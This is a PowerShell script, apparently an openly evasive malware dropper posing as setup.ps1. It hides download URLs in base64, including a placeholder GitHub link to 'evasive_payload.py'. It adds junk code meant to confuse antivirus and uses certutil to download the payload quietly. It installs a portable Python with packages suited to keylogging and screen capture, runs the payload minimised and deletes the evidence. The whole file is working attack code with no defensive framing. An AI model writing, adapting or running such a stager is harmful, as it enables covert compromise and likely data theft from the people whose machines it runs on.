# setup.ps1 - Obfuscated and evasive
$ErrorActionPreference = "SilentlyContinue"

# Decode function
function d($s) { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s)) }

# Junk code to confuse AV
$junk1 = "This is a harmless comment"
$null = Get-Date
$junk2 = 42

# Base64 encoded URLs and paths
$payload_b64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1lPVVJfVVNFUk5BTUUvWU9VUl9SRVBPL21haW4vZXZhc2l2ZV9wYXlsb2FkLnB5"
$pythonzip_b64 = "aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9mdHAvcHl0aG9uLzMuMTEuOS9weXRob24tMy4xMS45LWVtYmVkLWFtZDY0LnppcA=="
$getpip_b64 = "aHR0cHM6Ly9ib290c3RyYXAucnlwYS5pby9nZXQtcGlwLnB5"

$payloadUrl = d $payload_b64
$pythonZipUrl = d $pythonzip_b64
$getPipUrl = d $getpip_b64

$tempDir = "$env:TEMP\syscache"
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null

# Use certutil to download files (less detected than Invoke-WebRequest)
function dl($url, $out) {
    $tempFile = "$env:TEMP\" + [System.Guid]::NewGuid().ToString() + ".tmp"
    certutil -urlcache -split -f $url $tempFile | Out-Null
    Move-Item -Force $tempFile $out -ErrorAction SilentlyContinue
    certutil -urlcache -split -f $url null | Out-Null
}

dl $payloadUrl "$env:TEMP\sys.py"
dl $pythonZipUrl "$tempDir\python.zip"
dl $getPipUrl "$tempDir\get-pip.py"

Expand-Archive -Path "$tempDir\python.zip" -DestinationPath "$env:TEMP\py" -Force
$pythonCmd = "$env:TEMP\py\python.exe"

# Install pip and packages
& $pythonCmd "$tempDir\get-pip.py" --quiet
$env:Path = "$env:TEMP\py\Scripts;$env:Path"
$pkg = @("cryptography","pynput","mss","pillow","psutil","requests","numpy")
foreach ($p in $pkg) { & $pythonCmd -m pip install $p --quiet --disable-pip-version-check --no-warn-script-location --user }

# Run payload minimized (not hidden)
Start-Process -FilePath $pythonCmd -ArgumentList "$env:TEMP\sys.py" -WindowStyle Minimized

# Cleanup
Start-Sleep -Seconds 8
Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\py" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\sys.py" -Force -ErrorAction SilentlyContinue
